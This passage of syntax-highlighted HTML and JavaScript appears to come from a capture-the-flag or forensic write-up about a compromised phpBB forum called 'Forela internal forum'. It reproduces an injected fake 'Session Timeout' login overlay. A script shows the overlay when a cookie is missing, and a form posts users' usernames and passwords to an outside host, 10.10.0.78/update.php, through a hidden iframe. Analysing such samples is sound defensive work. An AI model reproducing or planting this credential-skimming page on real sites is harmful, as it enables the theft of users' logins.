class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);    <span class="hljs-keyword">let</span> ca = cookies.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;;&#x27;</span>);    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ca.<span class="hljs-property">length</span>; i++)    &#123;        <span class="hljs-keyword">let</span> c = ca[i];        <span class="hljs-keyword">while</span>(c.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27; &#x27;</span>)        &#123;            c = c.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">if</span>(c.<span class="hljs-title function_">indexOf</span>(name) == <span class="hljs-number">0</span>) &#123;            cookieexists = <span class="hljs-literal">true</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span>(cookieexists)&#123;        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">var</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;zbzbz1234&#x27;</span>);    modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&quot;hidden&quot;</span>);&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hiddenframe&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hiddenframe&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;modal hidden&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;zbzbz1234&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;shouldshow&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wrap&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrap&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;top&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;top-anchor&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;t&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;page-header&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;headerbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;banner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;site-description&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;site-description&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;logo&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.php&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Board index&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;site_logo&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>forum.forela.co.uk<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Forela internal forum<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;skiplink&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#start_here&quot;</span>&gt;</span>Skip to content<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;search-box&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;search-box search-header&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;search1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keywords1&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;128&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Search for keywords&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputbox search tiny&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Searchâ€¦&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-search&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-search fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-search-end&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Advanced search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-cog fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Advanced search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nav-main&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-main linklist&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menubar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;quick-links&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;quick-links dropdown-container responsive-menu&quot;</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-trigger dropdown-toggle&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-bars fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Quick links<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer-inner&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-contents&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;separator&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php?search_id=unanswered&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-file-o fa-fw icon-gray&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Unanswered topics<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php?search_id=active_topics&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-file-o fa-fw icon-blue&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Active topics<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;separator&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-search fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;separator&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/phpBB3/app.php/help/faq&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;help&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Frequently Asked Questions&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-question-circle fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>FAQ<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=login&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Login&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-power-off fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=register&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-pencil-square-o  fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Register<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>&lt;/li data-skip-responsive=&quot;true&quot;&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nav-breadcrumbs&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-breadcrumbs linklist navlinks&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menubar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;breadcrumbs&quot;</span> <span class="hljs-attr">itemscope</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">itemtype</span>=<span class="hljs-string">&quot;http://schema.org/BreadcrumbList&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;max-width: 936px;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;crumb&quot;</span> <span class="hljs-attr">itemtype</span>=<span class="hljs-string">&quot;http://schema.org/ListItem&quot;</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;itemListElement&quot;</span> <span class="hljs-attr">itemscope</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.php&quot;</span> <span class="hljs-attr">itemtype</span>=<span class="hljs-string">&quot;https://schema.org/Thing&quot;</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;item&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;h&quot;</span> <span class="hljs-attr">data-navbar-reference</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Board index&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-home fa-fw&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>Board index<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;position&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside responsive-search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;View the advanced search options&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-search fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;start_here&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;anchor&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;page-body&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-body&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Session Timeout<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Your session token has timed out in order to proceed you must login again.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10.10.0.78/update.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">data-focus</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;hiddenframe&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;login-title&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fields1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>Username:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;25&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputbox autowidth&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;25&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputbox autowidth&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;autologin&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autologin&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;autologin&quot;</span> <span class="hljs-attr">tabindex</span>=<span 